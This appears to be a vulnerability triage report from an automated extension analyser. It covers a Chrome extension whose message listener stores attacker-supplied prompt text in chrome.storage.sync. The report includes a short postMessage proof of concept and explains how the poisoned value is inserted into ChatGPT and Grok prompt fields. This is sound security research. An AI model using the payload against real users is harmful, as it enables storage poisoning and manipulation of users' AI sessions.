# CoCo Analysis: nobfipgfmgoljhlbjjnkpbboojegfmld

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nobfipgfmgoljhlbjjnkpbboojegfmld/opgen_generated_files/cs_0.js
Line 1781	window.addEventListener("message", function (event) {
Line 1784	  switch (event.data.type) {
Line 1786	      if (event.data.sentence) {

**Code:**

```javascript
// Content script - Entry point (cs_0.js, Line 1781-1806)
window.addEventListener("message", function (event) {
  if (event.source !== window || !chrome.runtime.id) return;

  switch (event.data.type) {
    case "sentence_changed":
      if (event.data.sentence) {
        chrome.storage.sync.set({
          sentence: event.data.sentence  // ← attacker-controlled
        });

        // Check if the message source is promptartisan.com
        if (event.data.source === "promptartisan.com") {
          chrome.storage.sync.set({
            firstTimeRun: true
          });
        }
      }
      break;

    default:
      break;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage

**Attack:**

```javascript
// From any webpage where the content script is injected:
// (https://www.promptartisan.com/*, https://chatgpt.com/*, https://x.com/*)
window.postMessage({
  type: "sentence_changed",
  sentence: "attacker-controlled-data",
  source: "promptartisan.com"
}, "*");
```

**Impact:** An attacker on any of the matched domains (promptartisan.com, chatgpt.com, x.com) can poison the extension's chrome.storage.sync with arbitrary data. The extension later reads this `sentence` value and uses it to populate text fields on ChatGPT, Grok, and other AI platforms (as seen in the handleChatGPTTab and handleGrokTab functions). This allows the attacker to control what prompts are automatically inserted into these AI platforms, potentially manipulating user interactions or exfiltrating information through crafted prompts.
